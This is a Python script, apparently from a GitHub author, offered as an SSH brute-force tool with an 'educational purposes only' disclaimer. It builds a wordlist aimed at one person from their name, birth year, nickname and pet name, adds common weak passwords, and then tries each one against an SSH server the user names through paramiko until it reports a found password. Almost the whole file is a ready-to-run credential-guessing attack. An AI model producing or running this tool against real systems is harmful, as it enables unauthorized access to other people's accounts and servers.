"""
SSH Brute Force Automation Tool with Custom and Strong Wordlist Generator
Author: p4cket-hunt3r (https://github.com/p4cket-hunt3r)
For Ethical Hacking Educational Purposes Only
if anyone use this for illegal purpose admin don't take responsbility
"""

import time
import os
import sys
import random
import string

# Step 0: Auto-install required module
try:
    import paramiko
except ImportError:
    print("[+] Installing required Python module: paramiko")
    os.system(f"{sys.executable} -m pip install paramiko")
    import paramiko

def generate_random_password(length=12):
    """
    Generate a strong random password (Google-style)
    """
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(chars) for _ in range(length))

def generate_wordlist(output_file):
    """
    Generate a target-specific wordlist with user-selected options.
    """

    print("\n[+] Wordlist Generation - Target Specific")

    name = input("Target Full Name: ").strip()
    birthyear = input("Birth Year: ").strip()
    nickname = input("Nickname: ").strip()
    petname = input("Pet Name: ").strip()

    include_symbols = input("Include symbols? (yes/no): ").strip().lower() == "yes"
    include_numbers = input("Include number patterns? (yes/no): ").strip().lower() == "yes"
    include_strong = input("Add strong random passwords (Google-style)? (yes/no): ").strip().lower() == "yes"

    password_list = []

    # Basic custom patterns
    password_list.append(name + "123")
    password_list.append(name + birthyear)
    password_list.append(nickname + "123")
    password_list.append(petname + "123")
    password_list.append(name + "@" + birthyear)
    password_list.append(name + "12345")
    password_list.append(petname + birthyear)

    # Common weak passwords
    common_passwords = ["password", "123456", "admin", "letmein", "welcome"]
    password_list.extend(common_passwords)

    # Number patterns
    if include_numbers:
        number_patterns = ["123456", "12345678", "987654", "112233"]
        for base in [name, nickname, petname]:
            for num in number_patterns:
                password_list.append(base + num)

    # Symbol patterns
    if include_symbols:
        symbol_patterns = ["!", "@", "#", "$", "%"]
        for base in [name, nickname, petname]:
            for sym in symbol_patterns:
                password_list.append(base + sym)
                password_list.append(base + sym + birthyear)
                password_list.append(sym + base + "123")

    # Strong random passwords
    if include_strong:
        for _ in range(10):
            password_list.append(generate_random_password(12))

    # Save to file
    with open(output_file, "w") as file:
        for pwd in password_list:
            file.write(pwd + "\n")

    print(f"[+] Wordlist saved as: {output_file}")
    print("[+] Total passwords generated:", len(password_list))


def ssh_bruteforce(target_ip, username, wordlist_file):
    """
    Attempt SSH brute force using the generated wordlist.
    """

    print("\n[+] Starting SSH Brute Force Process...")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(wordlist_file, "r") as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"[-] Wordlist file '{wordlist_file}' not found!")
        return

    for password in passwords:
        password = password.strip()
        try:
            print(f"[*] Trying: {password}")
            client.connect(target_ip, username=username, password=password, timeout=3)
            print(f"\n[+] Access Granted! Password Found: {password}")
            return
        except paramiko.AuthenticationException:
            print(f"[-] Wrong Password: {password}")
        except Exception as e:
            print(f"[!] Connection Error: {e}")

        time.sleep(0.5)

    print("\n[-] Brute Force Completed. Password not found in wordlist.")


if __name__ == "__main__":
    print("\n==== SSH Brute Force Automation Tool ====")

    wordlist_file = "target_wordlist.txt"
    generate_wordlist(wordlist_file)

    print("\n[+] Enter SSH Target Details")
    target_ip = input("Target IP Address: ").strip()
    target_username = input("SSH Username: ").strip()

    ssh_bruteforce(target_ip, target_username, wordlist_file)

    print("\n==== Process Completed ====")
    print("This tool is for ethical hacking education and authorized testing only.")